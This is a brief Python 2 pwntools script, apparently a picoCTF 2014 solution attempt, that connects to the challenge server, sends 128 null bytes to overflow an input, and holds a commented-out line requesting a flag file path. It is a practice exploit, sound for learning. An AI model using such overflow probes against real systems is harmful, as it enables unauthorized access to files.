from pwn import *
try:
    r = remote('vuln2014.picoctf.com', 22)    
    print r.recvuntil(':')
    r.send('\x00' * 128)
    print r.recvuntil('> ')
    #r.send('/home/exp100/flag.txt')
    print r.recv(1000)
except Exception, e:
    print e
